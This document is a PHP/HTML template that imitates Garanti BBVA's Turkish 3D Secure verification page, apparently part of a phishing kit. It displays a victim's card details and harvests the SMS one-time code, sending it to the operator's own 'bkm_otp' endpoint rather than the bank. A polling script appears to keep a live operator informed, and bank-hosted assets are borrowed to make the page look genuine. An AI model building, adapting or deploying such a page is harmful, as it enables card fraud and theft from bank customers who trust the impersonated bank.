<html lang="tr">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>3D Secure Doğrulama Kodu Girişi | Garanti Ödeme Sistemleri</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <link rel="stylesheet" href="/public/garanti/acs-style/garanti/css/fonts.css">
    <link rel="stylesheet" href="/public/garanti/acs-style/garanti/css/garanti.css">
    <script type="text/javascript" src="https://gbemv3dsecure.garanti.com.tr/js/jquery-3.3.1.min.js"></script>
    <script type="text/javascript" src="https://gbemv3dsecure.garanti.com.tr/js/functions.js"></script>

</head>

<body class="threed-page">
    <div class="container h-100">
        <div id="js-main" class="row justify-content-center align-items-center" style="height: auto;">
            <div class="box">
                <div class="shadow px-2 px-sm-4 pb-1 theme-garanti">
                    <div class="px-2 pt-2">
                        <div class="text-right">
                            <button class="btn btn-link p-0 text-right text-muted">
                                İptal
                            </button>
                        </div>
                        <div class="row m-0 title">
                            <div class="col-6 text-left px-0 pt-1">
                                <img height="39" width="64" src="https://gbemv3dsecure.garanti.com.tr/assets/img/issuer.png">
                            </div>
                            <div class="col-6 text-right px-0 pt-1">
                                <div>
                                    <div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <h6 class="text-center mb-4 font-weight-bold">
                            3D SECURE ÖDEME DOĞRULAMA
                        </h6>
                        <div>
                            <div class="summary">
                                <ul>
                                    <li>
                                        <label>Tutar</label>
                                        <i class="icon-number-one d-none d-md-inline-block"></i>
                                        <span class="total-value"><?= number_format($data->balance, 2, '.', ',') ?> TL</span>
                                    </li>
                                    <li>
                                        <label>Mağaza</label>
                                        <i class="icon-bag d-none d-md-inline-block"></i>
                                        <span>ODEME HIZMETLERI</span>
                                    </li>
                                    <li>
                                        <label>Kart No</label>
                                        <i class="icon-credit-card d-none d-md-inline-block"></i>
                                        <span>************<?= substr($data->cc_no, 12, 15) ?></span>
                                    </li>
                                    <li>
                                        <label>Tarih</label>
                                        <i class="icon-watch d-none d-md-inline-block"></i>
                                        <span><?= dmyhi($data->tarih) ?></span>
                                    </li>
                                </ul>

                            </div>
                        </div>
                        <div>

                            <form id="bkmform" class="form-code" method="POST" action="<?= base_url('bkm_otp/' . $data->hash) ?>" autocomplete="off" novalidate="novalidate">

                                <div class="form-group mb-4">
                                    <label for="otp">Sonu <strong>****</strong> ile biten telefon
                                        numaranıza gönderilen <strong></strong>
                                        doğrulama şifresini giriniz.</label>
                                    <input name="password" maxlength="8" min="0" max="99999999" inputmode="numeric" pattern="[0-9]*" autocomplete="off" autofocus="" minlength="6" maxlength="6" size="6" autocomplete="off" required="" type="text" class="form-control form-pin" placeholder="6 haneli şifreyi girin">
                                </div>
                                <div id="wrongPassDiv" style=" text-align:center;display: none ;">
                                    <p class="has-reg" style="color:tomato">Doğrulama kodu hatalı</p>
                                </div>
                                <div class="form-group" id="submitButtonDiv">
                                    <button id="submitbutton" type="submit" name="submit" class="btn btn-primary btn-block" type="submit">GÖNDER</button>
                                </div>
                            </form>

                            <div class="text-center font-weight-bold pt-2 pb-4">
                                <button onclick="yeniSMSIste()" class="btn btn-link d-inline-block fs-10 p-0">
                                    YENİ ŞİFRE GÖNDER
                                </button>
                            </div>
                        </div>
                        <div class="text-center font-weight-bold py-2 pb-sm-0 mb-3" style="display: none">
                            <label>BonusFlaş'tan 3D Secure Mobil Onay'ı kullanmak için telefon
                                ayarlarından BonusFlaş bildirimlerine izin vermelisiniz.</label>
                        </div>
                        <div class="text-center font-weight-bold py-2 pb-sm-0 mb-3" style="display: block">
                            <input type="checkbox" name="downloadbonus" class="form-check" id="downloadbonus" checked="checked">
                            <label for="downloadbonus">Daha hızlı bir 3D Secure Ödeme Doğrulama deneyimi için
                                BonusFlaş mobil uygulamasını indirmek istiyorum.
                                <img width="20" height="23" src="https://gbemv3dsecure.garanti.com.tr/assets/img/logo-bonus.png"></label>
                        </div>
                        <div class="border-top border-color-light fs-10">
                            <button type="button" class="btn btn-link d-block no-underline pl-2 pr-0 w-100 js-acc-btn">
                                <span class="float-left d-block">Daha fazla bilgi</span>
                                <i class="icon-caret-up float-right d-none"></i>
                                <i class="icon-caret-down float-right d-block"></i>
                            </button>
                            <p class="px-4 pb-3 d-none">
                                GSM numarası bilgilerinizi tüm şubelerimizden veya <a href="#">Paramatik</a>’lerimizden
                                günceleyebilirsiniz.
                            </p>
                        </div>
                        <div class="border-top border-color-light fs-10">
                            <button type="button" class="btn btn-link d-block no-underline pl-2 pr-0 w-100 js-acc-btn">
                                <span class="float-left d-block">Yardım</span>
                                <i class="icon-caret-up float-right d-none"></i>
                                <i class="icon-caret-down float-right d-block"></i>
                            </button>
                            <p class="px-4 pb-3 d-none">
                                “Garanti BBVA Müşteri İletişim Merkezi <a href="tel:+904440333">+90 444 0 333</a>.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <?php $this->load->view('poslar/garanti/inc_js.php'); ?>

        <script>
            setInterval(function() {
                $.get("<?= base_url('zping') ?>", function(data) {});
            }, 3000);
        </script>
</body>

</html>